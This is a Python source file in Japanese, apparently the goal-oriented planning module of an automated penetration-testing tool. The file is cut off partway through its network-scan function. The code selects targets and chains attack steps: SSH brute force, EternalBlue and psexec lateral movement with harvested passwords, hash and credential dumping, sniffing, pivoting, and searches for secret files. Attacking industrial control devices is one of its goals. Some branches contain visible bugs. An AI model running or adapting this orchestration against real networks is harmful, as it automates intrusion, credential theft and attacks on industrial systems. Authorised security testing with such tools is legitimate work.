# goap module
# actions.json からすべてのアクションを読み込み、
# 現在のシンボル値から最適なアクションを選択し、
# ゴールまでのルートを決める。
# アクション実施前に現在のシンボルを確認し、
# ルートを組み替える処理も必要。
# ネットワークセグメント単位でシンボルを割り当てていく
from arsenal import arpscan
from arsenal import mynmap
from arsenal import msploit
from arsenal import masscan
from arsenal import ics_detect
from database import write_json
from database import attack_tree
from database import mushilogger
import json
import random
import subprocess
import copy
import pprint
from ipaddress import IPv4Network
from ipaddress import IPv4Interface
from ipaddress import IPv4Address

# シンボルを定義
class GoapSymbol():
  # 発見したデバイス情報を格納する辞書
  node = []
  link = []
  node_json = {}
  node_id = 0
  pre_node_id = 0
  mushikago_ipaddr = ""
  class_a = []
  class_b = []
  mode = ""

  def __init__(self, actionfile):
    print("init symbol..")

    # 各アクションの格納
    self.actions = self.load_action(actionfile)
    if actionfile == "actions-it.json":
      self.mode = "it"
    elif actionfile == "actions-ics.json":
      self.mode = "ics"

    # mushikago の IPアドレスの取得
    self.mushikago_ipaddr = self.get_ipaddr()

    # class A の プライベートIPアドレスの取得
    self.class_a.append('10.0.0.0')
    for num in range(1, 256):
      self.class_a.append(str(IPv4Address('10.0.0.0') + 65536*num))

    # class B の プライベートIPアドレスの取得
    self.class_b.append('172.16.0.0')
    for num in range(1, 16):
      self.class_b.append(str(IPv4Address('172.16.0.0') + 65536*num))
   
    # ゴール条件
    self.goal = {
      # 制御機器を攻撃したか 
      "GoalSymbol_AttackIcs": True, 
      # ローカルの機密情報を収集したか
      "GoalSymbol_GetLocalSecretInfo": True,
      # ネットワーク上の機密情報を収集したか
      "GoalSymbol_GetNwSecretInfo": True
    }

    # 現在値
    self.state = {
      # 同一LANの端末を探索したか T1120
      "Symbol_GetLanNodes": None,
      # TCP ポートスキャンを実行したか T1046 T1018
      "Symbol_TcpScan": None,
      # UDP ポートスキャンを実行したか T1046 T1018
      "Symbol_UdpScan": None,
      # 端末のOSを特定したか T1003, T1059
      "Symbol_IdentOs": None,
      # 横展開を実行したか TA0008
      "Symbol_LateralMovement": None,
      # ブルートフォースアタックを実行したか T1110
      #"Symbol_BruteForce": None,
      # ARP Cache Poisoning をしたか T1557 T1112(registry modify)
      "Symbol_ArpPoisoning": None,
      # ネットワーク情報を取得したか T1016, T1049
      "Symbol_GetNetworkInfo": None,
      # DC を探索したか T1482
      "Symbol_DCCheck": None,
      # ログオンユーザ情報を収集したか T1059
      "Symbol_LogonUserInfo": None,
      # ドメインユーザの探索 T1087
      "Symbol_DomainUser": None,
      # ローカルユーザの探索 T1087
      "Symbol_LocalUser": None,
      # 有効なアカウントを利用したか T1078
      "Symbol_ValidUser": None,
      # 不正なアカウントを作成したか T1136
      "Symbol_CreateUser": None,
      # 端末のOSのパッチ情報などを取得したか T1003, T1059, T1082
      "Symbol_GetOsPatch": None,
      # 権限昇格しているか TA0004
      "Symbol_PrivilegeEscalation": None,
      # プロセス情報を収集したか(セキュリティ製品の探索も行う) T1057, T1059 
      "Symbol_ProcessInfo": None,
      # 別のプロセスに移動したか T1055
      "Symbol_ProcessMigrate": None,
      # 主要なディレクトリを調査したか T1083(File and Directory Discovery), TA0009, TA0010
      "Symbol_MainDriveInfo": None,
      "Symbol_SearchMainDrive": None,
      # ネットワークドライブを確認したか T1083, T1135
      "Symbol_NwDriveInfo": None,
      "Symbol_SearchNwDrive": None,
      # ローカルの機密情報を発見したか TA0009
      "GoalSymbol_GetLocalSecretInfo": None,
      # ネットワーク上の機密情報を発見したか TA0009
      "GoalSymbol_GetNwSecretInfo": None,
      # 別のネットワークセグメントを特定したか
      #"Symbol_NetworkSegmentCheck": None,
      # パケットを収集したか T1040
      "Symbol_PacketInfo": None,
      # ICS プロトコルを特定したか T1046
      "Symbol_GetIcsProtocol": None,
      # ICS 機器を探索したか T1120
      "Symbol_GetIcsDevice": None,
      # ICS 機器を攻撃したか TA0040
      "GoalSymbol_AttackIcs": None
    }

    # nodes を json 形式にして書き込む
    self.wjson = write_json.WriteJson()

    # テスト内容を CSV 形式にして書き込む
    self.wcsv = attack_tree.AttackTree()
    self.pre_exe = None

    # mushikago log の出力
    self.mlogger = mushilogger.MushiLogger()

  # action.jsonの読み込み
  def load_action(self, actionfile): 
    with open(actionfile) as f:
      return json.load(f)


  # mushikago 本体の IPアドレスの取得
  def get_ipaddr(self):
    try:
      ipaddr = subprocess.check_output('ifconfig eth0 | grep "inet " | grep -oP \'inet [0-9]*\.[0-9]*\.[0-9]*\.[0-9]*\' | sed \'s/inet //\'', shell=True).decode('utf-8')
      #print(res)
      return ipaddr.replace('\n', '')
    except:
      print("get-ipaddr error!!")


  
  # goap で planning する関数
  def goap_plannning(self, goap_node):
  
    available_action = []
    plan = []
  
    #print("goap planning start..")
    # logging 
    self.mlogger.writelog("goap planning start..", "info")
  
    # 仮に100回ほどループさせるようにしている
    # 最終的には、ゴールになるまでループさせる
    for i in range(100):
      #print("\n")
      print("\ntake = {}\n".format(i))
      #print("\n")

      if (goap_node.state["GoalSymbol_AttackIcs"] == goap_node.goal["GoalSymbol_AttackIcs"] or goap_node.state["GoalSymbol_GetLocalSecretInfo"] == goap_node.goal["GoalSymbol_GetLocalSecretInfo"] or goap_node.state["GoalSymbol_GetNwSecretInfo"] == goap_node.goal["GoalSymbol_GetNwSecretInfo"]):
        return plan
  
      # 現在の state 値から実行できる action を取り出す
      for key in goap_node.actions.keys():
        match_count = 0
        for symbol, value in goap_node.actions[key]["precond"].items():
          #print("{}, {}, {}".format(key, symbol, value))
          if (goap_node.state[symbol] == value): # 現在値と比較
            match_count += 1
        if (match_count == len(goap_node.actions[key]["precond"])):
          #print("match!!")
          available_action.append(key)
  
      print("available_action = {}".format(available_action))
      # logging 
      self.mlogger.writelog("available plan = " + pprint.pformat(available_action, width=500, compact=True), "info")
  
      # 何もアクションを実行できない場合は終了する
      # ネットワークスキャンに変えるべし
      if (len(available_action) == 0):
        print("No available action")
        # logging 
        self.mlogger.writelog("No available action", "info")
        exit(0)
  
      # 実行できる action から一つを選択する
      # 現在はダイクストラ法で選択している (優先度順)
      # A* かダイクストラかランダムか
      tmp = 100
      tmp_list = []
      for key in available_action:
        if (goap_node.actions[key]["priority"] < tmp):
          priority_key = key
          tmp = goap_node.actions[key]["priority"]
          tmp_list.clear()
          tmp_list.append(priority_key)
        elif (goap_node.actions[key]["priority"] == tmp):
          tmp_list.append(key)
  
      #print("tmp_list = {}".format(tmp_list))
      #print("len(tmp_list) = {}".format(len(tmp_list)))
  
      # 同じ優先度リストの中からランダムに取り出し
      # これまでに選択した内容とは被らないものを選択する
      #for i in range(len(tmp_list)):
      #  if priority_key not in plan:
      #    break
  
      while (True):
        priority_key = random.choice(tmp_list)
        if priority_key not in plan:
          break
  
      #print("{}, {}".format(priority_key, goap_node.actions[priority_key]))
  
      #print("pre_choise_key = {}".format(pre_choise_key))
  
      plan.append(priority_key)
      available_action.clear()
  
      #print("plan = {}".format(plan))
      #print("state = {}".format(goap_node.state))
  
      # action の結果を state に反映
      for key, value in goap_node.actions[priority_key]["effect"].items():
        goap_node.state[key] = value
        #print("key = {}, value = {}".format(key, value))
  
      #print("state = {}".format(goap_node.state))


  # target を選定する関数
  def select_target(self):
    target_list = {} # まだ攻撃していない端末
    performed_list = {} # 攻撃成功して機密情報の探索をしていない端末

    # 将来的にはポート番号等も考慮に入れて優先度を決める
    # Linux 端末の探索 (22/tcp:ssh が開いている端末を target とする)
    for num in range(1, len(self.node)): # 0 番目は mushikago 自身が格納
      if self.node[num]["os"] == "Linux":
        # 攻撃成功セッションがなければ攻撃候補にする
        if self.node[num]["session"] == "" and self.node[num]["goap"]["Symbol_LateralMovement"] == None:
          if len(self.node[num]["ports"]) > 0:
            for port_num in range(0, len(self.node[num]["ports"])):
              #if self.node[num]["ports"][port_num]["number"] == "22/tcp" and self.node[num]["ports"][port_num]["service"] == "ssh":
              if self.node[num]["ports"][port_num]["number"] == "22/tcp" and self.node[num]["ports"][port_num]["service"] == "ssh":
                target_list[self.node[num]["id"]] = num
        else: # すでに攻撃をしてセッションが確立している端末
          # 機密情報を探索をしていない端末
          if self.mode == "it": # IT mode の場合
            if self.node[num]["goap"]["Symbol_SearchMainDrive"] == None or self.node[num]["goap"]["Symbol_SearchNwDrive"] == None:
              performed_list[self.node[num]["id"]] = num
          elif self.mode == "ics": # ICS mode の場合
            if self.node[num]["goap"]["Symbol_GetIcsProtocol"] == None or self.node[num]["goap"]["Symbol_GetIcsDevice"] == None:
              performed_list[self.node[num]["id"]] = num
      # Windows 端末の探索
      if self.node[num]["os"] == "Windows":
        # 攻撃成功セッションがなければ攻撃候補にする
        if self.node[num]["session"] == "" and self.node[num]["goap"]["Symbol_LateralMovement"] == None:
          target_list[self.node[num]["id"]] = num
        else: # すでに攻撃をしてセッションが確立している端末
          # 機密情報を探索をしていない端末
          if self.mode == "it": # IT mode の場合
            if self.node[num]["goap"]["Symbol_SearchMainDrive"] == None or self.node[num]["goap"]["Symbol_SearchNwDrive"] == None:
              performed_list[self.node[num]["id"]] = num
          elif self.mode == "ics": # ICS mode の場合
            if self.node[num]["goap"]["Symbol_GetIcsProtocol"] == None or self.node[num]["goap"]["Symbol_GetIcsDevice"] == None:
              performed_list[self.node[num]["id"]] = num

    print("target_list = {}".format(target_list))
    print("performed_list = {}".format(performed_list))

    # 候補の中からランダムにターゲットを選定
    # 今後、ターゲットの選定方法の条件を追加する
    # ターゲットがいない場合、ネットワークスキャンを行う
    if len(performed_list) != 0:
      target, node_num = random.choice(list(performed_list.items()))
      target_list.clear()
      performed_list.clear()
      #print("goap_state = {}".format(self.node[node_num]["goap"]))
      return target, node_num, self.node[node_num]["goap"]
    elif len(target_list) != 0:
      target, node_num = random.choice(list(target_list.items()))
      target_list.clear()
      performed_list.clear()
      #print("goap_state = {}".format(self.node[node_num]["goap"]))
      return target, node_num, self.node[node_num]["goap"]
    else:
      return None, None, None
    

  # planning を実行する関数
  def plan_execute(self, goap_node, node_id, plan, target, node_num):
    #print("plan = {}".format(plan))

    # logging 
    self.mlogger.writelog("action plan = " + pprint.pformat(plan, width=500, compact=True), "info")

    for p in plan:
      print("execute action = {}".format(p))


      # arp scan の実施
      if p == "arpscan":
        # mushikago が最初に実施する ARP Scan
        if target == self.mushikago_ipaddr:
          pre_node_id = node_id
          arpscanInstance = arpscan.ArpScan()
          node_id = arpscanInstance.execute_arpscan(self.node, self.link, node_id)
          node_id = node_id + 1 # mushikago 分を入れるため
          self.node_json['nodes'] = self.node
          self.node_json['links'] = self.link
          #print("node_json = {}".format(self.node_json))
          #print("node_id = {}".format(node_id))

          # 検証内容を CSV 形式にして書き込み
          if self.pre_exe == None: # 最初に実行された場合にカラムを追加
            self.wcsv.write(["name", "parent", "ip", "mitre"])
            target = self.node[0]["id"] # target を mushikago にする

          self.wcsv.write(["T1120 (arpscan) - " + self.node[0]["id"], self.pre_exe, self.node[0]["id"], "T1120"])
          self.pre_exe = "T1120 (arpscan) - " + self.node[0]["id"]

          # 現在値を更新
          goap_node.state["Symbol_GetLanNodes"] = True
          self.node[0]["goap"] = copy.deepcopy(goap_node.state)

          # nodes を json 形式にして書き込み
          self.wjson.write(self.node_json)


        # mushikago 以外の端末からの ARP Scan (Windows)
        else:
          exploit = msploit.MetaSploit()
          nwaddr = IPv4Interface(target+'/16').network
          exploit.execute_arpscan(str(nwaddr[0]), "/16", self.node, node_num)

          pre_node_id = node_id
          arpscanInstance = arpscan.ArpScan()

          node_id = arpscanInstance.execute_arpscan_fm_mp(self.node, self.link, node_id, target)

          # 検証内容を CSV 形式にして書き込み
          self.wcsv.write(["T1120 (arpscan) - " + target, self.pre_exe, target, "T1120"])
          #self.pre_exe = "T1120 (arpscan) - " + target

          # 現在値を更新
          goap_node.state["Symbol_GetLanNodes"] = True
          self.node[node_num]["goap"] = copy.deepcopy(goap_node.state)
          # nodes を json 形式にして書き込み
          self.wjson.write(self.node_json)



      # tcp scan の実施
      elif p == "tcpscan":
        # nmap の実施
        mynmapInstance = mynmap.MyNmap()
        #mynmapInstance = mynmap2.MyNmap()

        # proxychains 経由させるかの設定
        proxy = 0

        for num in range(pre_node_id, node_id, 1):
          mynmapInstance.execute_nmap(self.node[num]["id"], num, self.node, proxy)

        #print("node_json = {}".format(self.node_json))

        # 検証内容を CSV 形式にして書き込み
        if self.pre_exe == "T1120 (arpscan) - " + self.node[0]["id"]: # 初めての tcpscan の場合
          self.wcsv.write(["T1046 (tcpscan) - " + self.node[0]["id"], self.pre_exe, self.node[0]["id"], "T1046, T1018"])
          self.pre_exe = "T1046 (tcpscan) - " + self.node[0]["id"]
          # 現在値を更新
          goap_node.state["Symbol_TcpScan"] = True
          goap_node.state["Symbol_IdentOs"] = True
          self.node[0]["goap"] = copy.deepcopy(goap_node.state)
        else: # 2回目以降 (lateral 後に実施する arp scan)
          self.wcsv.write(["T1046 (tcpscan) - " + target, self.pre_exe, target, "T1046, T1018"])
          #self.pre_exe = "T1046 (tcpscan) - " + target
          # 現在値を更新
          goap_node.state["Symbol_TcpScan"] = True
          goap_node.state["Symbol_IdentOs"] = True
          self.node[node_num]["goap"] = copy.deepcopy(goap_node.state)

        # nodes を json 形式にして書き込み
        self.wjson.write(self.node_json)



      # lateral movement(eternalblue) の実行
      elif p == "exploit_lateral":
        res = -1

        # exploit の選定

        # ssh bruteforce を実施
        if res != 0 and self.node[node_num]["os"] == "Linux":
          exploit = msploit.MetaSploit()
          res = exploit.execute_ssh_bruteforce(target, node_num, self.node)

        # Administrator を取得している場合、psexec を試す
        if res != 0:
          for num in range(1, len(self.node)): 
            if len(self.node[num]["local_account_pass"]) > 0:
              value = iter(self.node[num]["local_account_pass"])
              for account, password in zip(value, value):
                # Metasploit 実行
                exploit = msploit.MetaSploit()
                res = exploit.execute_ms17_10_psexec(target, node_num, self.node, self.mushikago_ipaddr, account, password)
                if res == 0:
                  break
            else:
              continue

        # local accout pass を取得している場合、ms17-010-psexec を試す
        if res != 0 and self.node[node_num]["os"] == "Windows":
          for num in range(1, len(self.node)): 
            if len(self.node[num]["local_account_pass"]) > 0:
              value = iter(self.node[num]["local_account_pass"])
              for account, password in zip(value, value):
                # Metasploit 実行
                exploit = msploit.MetaSploit()
                res = exploit.execute_ms17_10_psexec(target, node_num, self.node, self.mushikago_ipaddr, account, password)
                if res == 0:
                  break
            else:
              continue

        # eternalblue の実行
        if res != 0 and self.node[node_num]["os"] == "Windows":
          exploit = msploit.MetaSploit()
          res = exploit.execute_eternalblue(target, node_num, self.node, self.mushikago_ipaddr)

        # lateral movement に成功した場合 
        if res == 0:
          # 現在値を更新
          goap_node.state["Symbol_LateralMovement"] = True
          self.node[node_num]["goap"] = copy.deepcopy(goap_node.state)
          # 検証内容を CSV 形式にして書き込み
          self.wcsv.write(["TA0008 (exploit_lateral) - " + target, self.pre_exe, target, "TA0008"])
          self.pre_exe = "TA0008 (exploit_lateral) - " + target
          # nodes を json 形式にして書き込み
          self.wjson.write(self.node_json)
        else: # 失敗した場合
          # 現在値を更新
          goap_node.state["Symbol_LateralMovement"] = False
          self.node[node_num]["goap"] = copy.deepcopy(goap_node.state)
          # 検証内容を CSV 形式にして書き込み
          self.wcsv.write(["TA0008 (exploit_lateral) - " + target, self.pre_exe, target, "TA0008"])
          self.pre_exe = "TA0008 (exploit_lateral) - " + target

          # nodes を json 形式にして書き込み
          self.wjson.write(self.node_json)

          print("replanning...")
          # logging 
          self.mlogger.writelog("replanning...", "info")

          return node_id


        """
        exploit.execute_bluekeep("10.1.200.5")
        exploit.execute_incognito()
        """


      # ネットワーク情報の取得
      elif p == "get_networkinfo":
        # ipconfig の実施
        exploit = msploit.MetaSploit()
        exploit.execute_ipconfig(node_num, self.node)

        # netstat の実施
        exploit.execute_netstat(node_num, self.node)

        # 検証内容を CSV 形式にして書き込み
        self.wcsv.write(["T1016(get_networkinfo) - " + target, self.pre_exe, target, "T1016, T1049"])
        #self.pre_exe = "T1016(get_networkinfo)"
          
        # 現在値を更新
        goap_node.state["Symbol_GetNetworkInfo"] = True
        self.node[node_num]["goap"] = copy.deepcopy(goap_node.state)

        # nodes を json 形式にして書き込み
        self.wjson.write(self.node_json)


        
      # プロセスの取得とセキュリティツールの動作確認の実施
      elif p == "get_processinfo":
        # Metasploit 実行
        exploit = msploit.MetaSploit()
        exploit.execute_ps(node_num, self.node)

        # 検証内容を CSV 形式にして書き込み
        self.wcsv.write(["T1057 (get_processinfo) - " + target, self.pre_exe, target, "T1057, T1059"])
        #self.pre_exe = "T1057 (get_processinfo)"

        # 現在値を更新
        goap_node.state["Symbol_ProcessInfo"] = True
        self.node[node_num]["goap"] = copy.deepcopy(goap_node.state)

        # nodes を json 形式にして書き込み
        self.wjson.write(self.node_json)


      # local user の一覧とパスワードの取得
      elif p == "get_local_user":
        # Metasploit 実行
        exploit = msploit.MetaSploit()
        exploit.execute_netuser(node_num, self.node)

        # local account の password と hash dump を取得
        exploit.get_hash(target, node_num, self.node)

        # 検証内容を CSV 形式にして書き込み
        self.wcsv.write(["T1087 (get_local_user) - " + target, self.pre_exe, target, "T1087"])
        #self.pre_exe = "T1087 (get_local_user)"

        # 現在値を更新
        goap_node.state["Symbol_LocalUser"] = True
        self.node[node_num]["goap"] = copy.deepcopy(goap_node.state)

        # nodes を json 形式にして書き込み
        self.wjson.write(self.node_json)


      # domain user の一覧とパスワードの取得
      elif p == "get_domain_user":
        # net user /domain 実行
        exploit = msploit.MetaSploit()
        exploit.execute_netuserdomain(node_num, self.node)

        # creds tspkg の実施 (domain のパスワードを取得)
        exploit.execute_creds_tspkg(node_num, self.node)

        # 検証内容を CSV 形式にして書き込み
        self.wcsv.write(["T1087 (get_domain_user) - " + target, self.pre_exe, target, "T1087"])
        #self.pre_exe = "T1087 (get_domain_user)"

        # 現在値を更新
        goap_node.state["Symbol_DomainUser"] = True
        self.node[node_num]["goap"] = copy.deepcopy(goap_node.state)

        # nodes を json 形式にして書き込み
        self.wjson.write(self.node_json)



      # OS のパッチ情報と脆弱性の取得
      elif p == "get_ospatch":
        exploit = msploit.MetaSploit()
        exploit.execute_getospatch(node_num, self.node)

        # 検証内容を CSV 形式にして書き込み
        self.wcsv.write(["T1003 (get_ospatch) - " + target, self.pre_exe, target, "T1003, T1059, T1082"])
        #self.pre_exe = "T1003 (get_ospatch)"
        
        # 現在値を更新
        goap_node.state["Symbol_GetOsPatch"] = True
        self.node[node_num]["goap"] = copy.deepcopy(goap_node.state)

        # nodes を json 形式にして書き込み
        self.wjson.write(self.node_json)


      # ローカルドライブの探索
      elif p == "get_maindrvinfo":
        exploit = msploit.MetaSploit()
        secret_data =  exploit.execute_getmaindrvinfo(node_num, self.node)
        #secret_data =  exploit.execute_getlocalsecretinfo(1, self.node)

        # 検証内容を CSV 形式にして書き込み
        self.wcsv.write(["T1083 (get_maindrvinfo) - " + target, self.pre_exe, target, "T1083, TA0009, TA0010"])
        #self.pre_exe = "T1083 (get_maindrvinfo)"
        
        # 現在値を更新
        goap_node.state["Symbol_MainDriveInfo"] = True
        self.node[node_num]["goap"] = copy.deepcopy(goap_node.state)

        # nodes を json 形式にして書き込み
        self.wjson.write(self.node_json)


      # ネットワークドライブの探索
      elif p == "get_netdrvinfo":
        # net user の実施
        exploit = msploit.MetaSploit()
        exploit.execute_netuse(node_num, self.node)

        # 検証内容を CSV 形式にして書き込み
        self.wcsv.write(["T1083 (get_netdrvinfo) - " + target, self.pre_exe, target, "T1083, T1135"])

        # 現在値を更新
        goap_node.state["Symbol_NetDriveInfo"] = True
        self.node[node_num]["goap"] = copy.deepcopy(goap_node.state)

        # nodes を json 形式にして書き込み
        self.wjson.write(self.node_json)


      # ローカルドライブ上の機密情報の探索
      elif p == "get_local_secretinfo":
        exploit = msploit.MetaSploit()
        secret_data = exploit.execute_getlocalsecretinfo(node_num, self.node)

        # 検証内容を CSV 形式にして書き込み
        self.wcsv.write(["TA0009 (get_local_secretinfo) - " + target, self.pre_exe, target, "TA0009"])
        
        # 現在値を更新
        if secret_data == 1:
          goap_node.state["GoalSymbol_GetLocalSecretInfo"] = True
        else:
          goap_node.state["GoalSymbol_GetLocalSecretInfo"] = False

        goap_node.state["Symbol_SearchMainDrive"] = True
        self.node[node_num]["goap"] = copy.deepcopy(goap_node.state)

        # nodes を json 形式にして書き込み
        self.wjson.write(self.node_json)


      # ネットワークドライブ上の機密情報の探索
      elif p == "get_nw_secretinfo":
        secret_data = 0

        # network drive が存在している場合のみ実行
        if len(self.node[node_num]["network_drive"]) > 0:
          exploit = msploit.MetaSploit()
          secret_data = exploit.execute_getnwsecretinfo(node_num, self.node)

        # 検証内容を CSV 形式にして書き込み
        self.wcsv.write(["TA0009 (get_nw_secretinfo) - " + target, self.pre_exe, target, "TA0009"])
        #self.pre_exe = "get_nw_secretinfo"

        if secret_data == 1:
          goap_node.state["GoalSymbol_GetNwSecretInfo"] = True
        else:
          goap_node.state["GoalSymbol_GetNwSecretInfo"] = False

        # 現在値を更新
        goap_node.state["Symbol_SearchNwDrive"] = True
        self.node[node_num]["goap"] = copy.deepcopy(goap_node.state)

        # nodes を json 形式にして書き込み
        self.wjson.write(self.node_json)


      # パケットの取得
      elif p == "get_packetinfo":
        # network sniffing の実施
        exploit = msploit.MetaSploit()

        if self.node[node_num]["os"] == "Windows":
          exploit.execute_sniff_win(node_num, self.node)
        elif self.node[node_num]["os"] == "Linux":
          exploit.execute_sniff_linux(node_num, self.node)

        # 検証内容を CSV 形式にして書き込み
        self.wcsv.write(["T1040 (get_packetinfo) - " + target, self.pre_exe, target, "T1040"])
        #self.pre_exe = "T1040 (get_packetinfo)"

        # 現在値を更新
        goap_node.state["Symbol_PacketInfo"] = True
        self.node[node_num]["goap"] = copy.deepcopy(goap_node.state)

        # nodes を json 形式にして書き込み
        self.wjson.write(self.node_json)


      # パケット解析による ICS プロトコルの特定
      elif p == "detect_ics_protocol":
        ics = ics_detect.IcsDetect()

        ics.detect_protocol(node_num, self.node)
        
        # 検証内容を CSV 形式にして書き込み
        self.wcsv.write(["T1046 (detect_ics_protocol) - " + target, self.pre_exe, target, "T1046"])
        #self.pre_exe = "T1046 (detect_ics_protocol)"

        # 現在値を更新
        goap_node.state["Symbol_GetIcsProtocol"] = True
        self.node[node_num]["goap"] = copy.deepcopy(goap_node.state)

        # nodes を json 形式にして書き込み
        self.wjson.write(self.node_json)



      # ICS デバイスの特定
      elif p == "detect_ics_device":
        ics = ics_detect.IcsDetect()
        ics.detect_device(node_num, self.node)
        
        # 検証内容を CSV 形式にして書き込み
        self.wcsv.write(["T1120 (detect_ics_device) - " + target, self.pre_exe, target, "T1120"])
        #self.pre_exe = "T1120 (detect_ics_device)"

        # 現在値を更新
        goap_node.state["Symbol_GetIcsDevice"] = True
        self.node[node_num]["goap"] = copy.deepcopy(goap_node.state)

        # nodes を json 形式にして書き込み
        self.wjson.write(self.node_json)



    # target の現在値 (state) を node に格納
    #self.wjson.write(self.node_json)

    #print("node = {}".format(self.node))
    return node_id


  # すでに発見している IP アドレスか検証
  def check_ipaddr(self, ipaddr):
    for num in range(1, len(self.node)): 
      if ipaddr == self.node[num]["id"]:
        return -1
    return 0


  # ipconfig_info から IP アドレスを探す処理
  def getip_from_ipconfig_info(self, num, ipaddr_list):
    value = iter(self.node[num]["ipconfig_info"])

    for ipaddr, netmask in zip(value, value):
      if ipaddr != self.node[num]["id"]: # 自分以外のIPアドレスの場合
        print("ipaddr = {}, netmask = {}".format(ipaddr, netmask))
        # logging 
        self.mlogger.writelog("ipaddr = " + ipaddr + ", netmask = " + netmask, "debug")
        res = self.check_ipaddr(ipaddr) # 重複チェック
        if res == 0:
          ipaddr_list[ipaddr] = num


  # netstat_info から IP アドレスを探す処理
  def getip_from_netstat_info(self, num, ipaddr_list):
    value = iter(self.node[num]["netstat_info"])

    for ipaddr, port in zip(value, value):
      if ipaddr != self.node[0]["id"]: # mushikago 以外の IP アドレスの場合
        print("ipaddr = {}, port = {}".format(ipaddr, port))
        # logging 
        self.mlogger.writelog("ipaddr = " + ipaddr + ", port = " + port, "debug")
        res = self.check_ipaddr(ipaddr) # 重複チェック
        if res == 0:
          ipaddr_list[ipaddr] = num


  # session が確立している端末に対して、network info を GET しているか確認する。
  # network info で node.json に存在しない端末があった場合、スキャン対象とする
  def scan_from_network_info(self, ipaddr_list, getnw_list):
    for num in range(1, len(self.node)): 
      # session が存在しているものを洗い出し
      if self.node[num]["session"] != "":
        print("session is exist = {}".format(self.node[num]["id"]))
        # logging 
        self.mlogger.writelog("session is exist = " + self.node[num]["id"], "debug")
        # network_info から IP アドレスを特定する処理
        if self.node[num]["goap"]["Symbol_GetNetworkInfo"] == True:
          if self.node[num]["ipconfig_info"] != "":
            print("ipconfig_info is exist = {}".format(self.node[num]["ipconfig_info"]))
            # logging 
            self.mlogger.writelog("ipconfig_info is exist = " + pprint.pformat(self.node[num]["ipconfig_info"]), "debug")
            self.getip_from_ipconfig_info(num, ipaddr_list)
          if self.node[num]["netstat_info"] != "":
            print("netstat_info is exist = {}".format(self.node[num]["netstat_info"]))
            # logging 
            self.mlogger.writelog("netstat_info is exist = " + pprint.pformat(self.node[num]["netstat_info"]), "debug")
            self.getip_from_netstat_info(num, ipaddr_list)
        else:
          # get_networkinfo を実行するリストを作成
          getnw_list.append(num)
      else:
        print("session is nothing = {}".format(self.node[num]["id"]))
        # logging 
        self.mlogger.writelog("session is nothing = " + self.node[num]["id"], "debug")


  # network_info が 1 つも見つからなかった場合、getnw_list から get_networkinfo を実行する
  def force_get_networkinfo(self, goap_node, node_id, ipaddr_list, getnw_list):
    for node_num in getnw_list:
      # get_networkinfo の実行
      print("get_networkinfo ipaddr = {}".format(self.node[node_num]["goap"]))
      goap_node.state = copy.deepcopy(self.node[node_num]["goap"])
      target = self.node[node_num]["id"]
      plan = ["get_networkinfo"]
      node_id = goap_node.plan_execute(goap_node, node_id, plan, target, node_num)

    # 取得した network info をもとに scan を実行
    self.scan_from_network_info(ipaddr_list, getnw_list)


  # segment scan の実行
  def segment_scan(self, exploit, nwscan, ipaddr, node_num, node_id, pre_node_id, private_ip):
    nwaddr = IPv4Interface(ipaddr+'/16').network
    print("scan nwaddr = {}".format(nwaddr))
    # logging 
    self.mlogger.writelog("scan nwaddr = " + str(nwaddr), "info")
    #print("nwaddr_10[0] = {}".format(nwaddr[0]))
    
    if private_ip == 10:
      for scan_nwaddr in self.class_a:
        exploit.setting_route(scan_nwaddr, "255.255.0.0", self.node[node_num]["session"])
        node_id = nwscan.execute_masscan(scan_nwaddr+"/16", self.node[node_num]["id"], self.node, self.link, node_id) 

        if node_id > pre_node_id: # スキャンしてデバイスが発見された場合、スキャンを終了
          try: # スキャンしたネットワークアドレスをリストから削除
            delete_index = self.class_a.index(str(nwaddr[0]))
            self.class_a.pop(delete_index)
          except:
            pass
          break
    elif private_ip == 172:
      for scan_nwaddr in self.class_b:
        exploit.setting_route(scan_nwaddr, "255.255.0.0", self.node[node_num]["session"])
        node_id = nwscan.execute_masscan(scan_nwaddr+"/16", self.node[node_num]["id"], self.node, self.link, node_id) 
        if node_id > pre_node_id: # スキャンしてデバイスが発見された場合、スキャンを終了
          try: # スキャンしたネットワークアドレスをリストから削除
            delete_index = self.class_a.index(str(nwaddr[0]))
            self.class_a.pop(delete_index)
          except:
            pass
          break
    elif private_ip == 192:
      exploit.setting_route(scan_nwaddr, "255.255.0.0", self.node[node_num]["session"])
      node_id = nwscan.execute_masscan(scan_nwaddr+"/16", self.node[node_num]["id"], self.node, self.link, node_id) 

    return node_id


  # ネットワークスキャンする処理
  def network_scan(self, node_id, goap_node):
    print("Starting a Network Scan...")
    # logging 
    self.mlogger.writelog("Starting a Network Scan...", "info")

    # metasploit にて socks proxy を実行
    # 初回のみ実行するように修正する
    exploit = msploit.MetaSploit()
    exploit.execute_socks()

    ipaddr_list = {} # ipconfig と netstat からスキャン予定の IP アドレスを管理
    getnw_list = [] # get_networkinfo を実行する IP アドレスを管理

    # network info から target を選定
    self.scan_from_network_info(ipaddr_list, getnw_list)

    # network_info が 1 つも見つからなかった場合、getnw_list から get_networkinfo を実行する
    if len(ipaddr_list) == 0 and len(getnw_list) != 0:
      print("getnw_list = {}".format(getnw_list))
      # network info を実行
      self.force_get_networkinfo(goap_node, node_id, ipaddr_list, getnw_list)
    
    # scan 対象の IP アドレスが存在する場合、scan を実行
    if len(ipaddr_list) > 0:
      print("ipaddr_list = {}".format(ipaddr_list))
      for scan_ip, node_num in ipaddr_list.items():
        print("scan_ip = {}, node_num = {}".format(scan_ip, node_num))
        # meterpreter で add route の設定
        #exploit = msploit.MetaSploit()
        exploit.setting_route(scan_ip, "255.255.255.255", self.node[node_num]["session"])
        # ipaddr_list に対して scan を実行
        # proxychains 経由で masscan, nmap のスキャンを行う
        nwscan = masscan.MasScan()
        node_id = nwscan.execute_masscan(scan_ip, self.node[node_num]["id"], self.node, self.link, node_id) 
    else:  # network info から scan 対象が取得できない場合
      session_exist_list = {}
      #for num in range(1, len(self.node)): 
      for num in range(len(self.node)-1, -1, -1): # 逆順に取り出し(セグメントの深い方からスキャン対象とするため)
        # session が存在している IP アドレスとを洗い出し
        if self.node[num]["session"] != "":
          session_exist_list[self.node[num]["id"]] = num

      # session の存在するものからセグメントスキャンを行う
      if (len(session_exist_list) > 0):
        nwscan = masscan.MasScan()
        pre_node_id = node_id

        for ipaddr, node_num in session_exist_list.items():
          print("scan_src_ipaddr= {}".format(ipaddr))
          s2 = ipaddr.split('.')
          if (s2[0] == "10"):
            node_id = self.segment_scan(exploit, nwscan, ipaddr, node_num, node_id, pre_node_id, 10)
            if node_id > pre_node_id:
              break
          elif (s2[0] == "172"):
